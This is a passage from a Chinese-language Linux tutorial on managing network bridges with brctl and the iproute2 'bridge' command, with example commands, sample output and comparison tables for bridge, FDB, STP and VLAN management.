br0 8000.000d3a8a7868 no eth1
vnet0
virbr0 8000.5254005098ae yes virbr0-nic
```

### 创建网桥

使用 `brctl addbr &lt;name&gt;` 可以创建出一个Linux Bridge

```bash
brctl addbr dev
```

### 在网桥上添加接口

使用 `brctl addif &lt;bridge_name&gt; &lt;interface_name&gt;` 可以在一个已经存在的 bridge 上添加一个接口

```bash
$ brctl addif br0 eth1
```

指定多个 `&lt;interface_name&gt;`  会向网桥上添加多个接口

```bash
$ brctl addif br0 enp0s3 enp1s3
```

### 删除网桥

使用 `brctl delbr &lt;bridge_name&gt;` 可以删除一个网桥

```bash
$ brctl delbr br0
```

### 检查网桥 STF 信息

使用 `brctl showstp &lt;bridge_name&gt;` 可以查看网桥的STF信息

```bash
$ brctl showstp br0
br0
bridge id 8000.000000000000
designated root 8000.000000000000
root port 0 path cost 0
max age 20.00 bridge max age 20.00
hello time 2.00 bridge hello time 2.00
forward delay 15.00 bridge forward delay 15.00
ageing time 300.00
hello timer 0.00 tcn timer 0.00
topology change timer 0.00 gc timer 0.00
flags
```

### 从网桥上删除接口

使用 `brctl delif &lt;bridge_name&gt; &lt;interface_name&gt;` 可以从网桥上删除接口。

```bash
$ brctl delif br0 enp0s3
```

### 开启/关闭生成树协议

使用 `brctl stp &lt;bridge_name&gt; on/off` 可以选择开启或关闭生成树协议

```bash
$ brctl stp br0 off
$ brctl stp br0 on
```

### 查看网桥上学到的MAC地址

使用 `brctl showmacs &lt;bridge_name&gt;` 可以查看网桥上学到的所有设备的MAC地址。

```bash
$ brctl showmacs br0
port no mac addr                is local?       ageing timer
1       00:74:16:87:14:de       yes                0.00
```

### 修改STP值

如果需要修改 STP 参数值，可以通过 `brctl setageing &lt;bridge_name&gt; &lt;value&gt;` 来修改

```bash
$ brctl setageing br0 100
```

## bridge &lt;sup&gt;&lt;a href=&#34;#6&#34;&gt;[6]&lt;/a&gt;&lt;/sup&gt;

***bridge*** 是一款用于展示和操作网桥地址和设备的命令，通常情况下

&gt; **各系统下的包名与安装**
&gt;
&gt; - Ubuntu/Debian: `iproute2`  ；`apt install iproute2`
&gt; - CentOS/Fedora: `iproute2` ；`yum install -y iproute2`
&gt; - Apline：`iproute2 ` ；`apk add iproute2`

bridge 命令可以完成三种类型的配置管理：

- 端口配置
- FDB管理
- VLAN 配置

大多数人都会使用 ***brctl*** 命令替代，而 ***bridge*** 通常只是来完成 ***FDB*** (forwarding database management ) 的相关操作。。也可以使用 ***bridge*** 命令创建和删除VLAN。

### bridge vs brct &lt;sup&gt;&lt;a href=&#34;#7&#34;&gt;[7]&lt;/a&gt;&lt;/sup&gt;

&lt;center&gt;BRIDGE MANAGEMENT&lt;/center&gt;

| 动作               | BRCTL                           | BRIDGE |
| ------------------ | ------------------------------- | ------ |
| 创建bridge         | `brctl addbr &lt;bridge&gt;`          |        |
| 删除bridge         | `brctl delbr &lt;bridge&gt;`          |        |
| 为bridge添加接口   | `brctl addif &lt;bridge&gt; &lt;ifname&gt;` |        |
| 删除bridge上的接口 | `brctl delbr &lt;bridge&gt;`          |        |

&lt;center&gt;FDB MANAGEMENT&lt;/center&gt;

| ACTION                              | BRCTL                                | BRIDGE                                               |
| ----------------------------------- | ------------------------------------ | ---------------------------------------------------- |
| 显示 FDB 中的 MAC 列表 | `brctl showmacs &lt;bridge&gt;`            | `bridge fdb show`                                    |
| 设置 FDB 条目老化时间 | `brctl setageingtime  &lt;bridge&gt; &lt;time&gt;` |                                                      |
| 设置 FDB 垃圾回收间隔 | `brctl setgcint &lt;brname&gt; &lt;time&gt;`     |                                                      |
| 添加FDB 条目(add)      |                                      | `bridge fdb add dev &lt;interface&gt; [dst, vni, port, via]` |
| 追加FDB条目(append) |      | `bridge fdb append  (parameters same as for fdb add)` |
| 删除 FDB 条目 |      | `bridge fdb delete (parameters same as for fdb add)` |

&lt;center&gt;STP MANAGEMENT&lt;/center&gt;

| ACTION                  | BRCTL                                   | BRIDGE |
| ----------------------- | --------------------------------------- | ------ |
| 打开/关闭 STP | `brctl stp &lt;bridge&gt; &lt;state&gt;`           |        |
| 设置网桥优先级 | `brctl setbridgeprio &lt;bridge&gt; &lt;priority&gt;` |        |
| 设置网桥转发延迟 | `brctl setfd &lt;bridge&gt; &lt;time&gt;` |      |
| 设置bridge  “hello”时间 | `brctl sethello &lt;bridge&gt; &lt;time&gt;` |      |
| 设置网桥最大消息年龄 | `brctl setmaxage &lt;bridge&gt; &lt;time&gt;` |      |
| 设置桥上端口开销 | `brctl setpathcost &lt;bridge&gt; &lt;port&gt; &lt;cost&gt;` | `bridge link set dev &lt;port&gt; cost &lt;cost&gt;` |
| 设置网桥端口优先级 | `brctl setportprio &lt;bridge&gt; &lt;port&gt; &lt;priority&gt;` | `bridge link set dev &lt;port&gt; priority &lt;priority&gt;` |
| 是否应端口处理 STP BDPU |      | `bridge link set dev &lt;port &gt; guard [on, off]` |
| 网桥是否应该在接收到的端口上发送流量 |      | `bridge link set dev &lt;port&gt; hairpin [on,off]` |
| 在端口上启用/禁用 fastleave 选项 |      | `bridge link set dev &lt;port&gt; fastleave [on,off]` |
| 设置 STP 端口状态 |      | `bridge link set dev &lt;port&gt; state &lt;state&gt;` |

&lt;center&gt;VLAN MANAGEMENT&lt;/center&gt;

| ACTION                         | BRCTL | BRIDGE                                                       |
| ------------------------------ | ----- | ------------------------------------------------------------ |
| 创建新的 VLAN 过滤器条目 |       | bridge vlan add dev &lt;dev&gt; [vid, pvid, untagged, self, master] |
| 删除 VLAN 过滤器条目 |      | bridge vlan delete dev &lt;dev&gt; (parameters same as for vlan add) |
| 列出 VLAN 配置 |      | bridge vlan show |




&gt; **Reference**
&gt;
&gt; &lt;sup id=&#34;1&#34;&gt;[1]&lt;/sup&gt; [tcpdump](https://danielmiessler.com/study/tcpdump/)
&gt;
&gt; &lt;sup id=&#34;2&#34;&gt;[2]&lt;/sup&gt; [linux mtr command](https://www.redhat.com/sysadmin/linux-mtr-command)
&gt;
&gt; &lt;sup id=&#34;3&#34;&gt;[3]&lt;/sup&gt; [man nsenter](https://man7.org/linux/man-pages/man1/nsenter.1.html)
&gt;
&gt; &lt;sup id=&#34;4&#34;&gt;[4]&lt;/sup&gt; [How to install nsenter](https://laramatic.com/how-to-install-nsenter-in-debian-ubuntu-alpine-arch-kali-CentOS-fedora-raspbian-and-macos/)
&gt;
&gt; &lt;sup id=&#34;5&#34;&gt;[5]&lt;/sup&gt; [examples for ethernet network bridge](https://www.cyberithub.com/10-best-linux-brctl-command-examples-for-ethernet-network-bridge/)
&gt;
&gt; &lt;sup id=&#34;6&#34;&gt;[6]&lt;/sup&gt; [man bridge](https://man7.org/linux/man-pages/man8/bridge.8.html)
&gt;
&gt; &lt;sup id=&#34;7&#34;&gt;[7]&lt;/sup&gt; [comparison of brctl and bridge](https://sgros-students.blogspot.com/2013/11/comparison-of-brctl-and-bridge-commands.html)
